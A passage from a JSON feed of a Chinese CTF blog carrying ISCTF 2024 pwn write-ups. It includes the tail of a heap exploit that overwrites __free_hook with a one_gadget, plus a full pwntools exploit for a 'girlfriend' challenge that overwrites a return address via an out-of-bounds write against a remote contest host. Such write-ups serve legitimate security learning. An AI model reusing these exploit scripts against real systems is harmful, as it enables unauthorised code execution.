punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'note: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># unsorted_bin</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4a1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3ebca0</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>__free_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f35e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f365</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f3c2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a45c</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>ogg_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f29e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f2a5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f302</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a2fc</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token comment\"># 3</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token comment\"># 13</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token comment\"># 14</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/11/30/24%E5%8F%A4%E5%89%91%E5%B1%B1/",
            "url": "https://yhuanhuan01.github.io/2024/11/30/24%E5%8F%A4%E5%89%91%E5%B1%B1/",
            "title": "",
            "date_published": "2024-11-30T12:57:33.558Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/11/18/ISCTF-WP-PWN/",
            "url": "https://yhuanhuan01.github.io/2024/11/18/ISCTF-WP-PWN/",
            "title": "ISCTF_WP_PWN",
            "date_published": "2024-11-18T10:15:03.000Z",
            "content_html": "<h1 id=\"isctf-2024\"><a class=\"markdownIt-Anchor\" href=\"#isctf-2024\">#</a> ISCTF 2024</h1>\n<p>好久没更新 blog 了，随便更新一篇近期的比赛吧。</p>\n<h2 id=\"netcat\"><a class=\"markdownIt-Anchor\" href=\"#netcat\">#</a> Netcat</h2>\n<p><img data-src=\"/img/ISCTF-2024/2.png\" alt=\"img\"></p>\n<h2 id=\"girlfriend\"><a class=\"markdownIt-Anchor\" href=\"#girlfriend\">#</a> girlfriend</h2>\n<p><img data-src=\"/img/ISCTF-2024/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/ISCTF-2024/4.png\" alt=\"img\"></p>\n<p>s1 要匹配 admin，通过 read 读入 buf，将 s1 处覆盖成 admin</p>\n<p>在 vuln 函数有数组越界改写漏洞，通过越界改写 i，从而 sacnf 可以改写返回</p>\n<p>exp 如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># context(arch='amd64', os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># libc = './'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"27.25.151.12:34617\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># libc = ELF(libc)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token string\">'admin\\x00\\x00\\x00'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'team id\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># for i in range(5):</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11111111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'birthday\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># debug('b* 0x4012cd')</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x40121E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/ISCTF-2024/1.png\" alt=\"img\"></p>\n<h2 id=\"ez_game\"><a class=\"markdownIt-Anchor\" href=\"#ez_game\">#</a> ez_game</h2>\n<p><img data-src=\"/img/ISCTF-2024/6.png\" alt=\"img\"></p>\n<p>种子为 1，伪随机，同时给了 gets 无限溢出漏洞，可以将种子覆盖掉，alarm 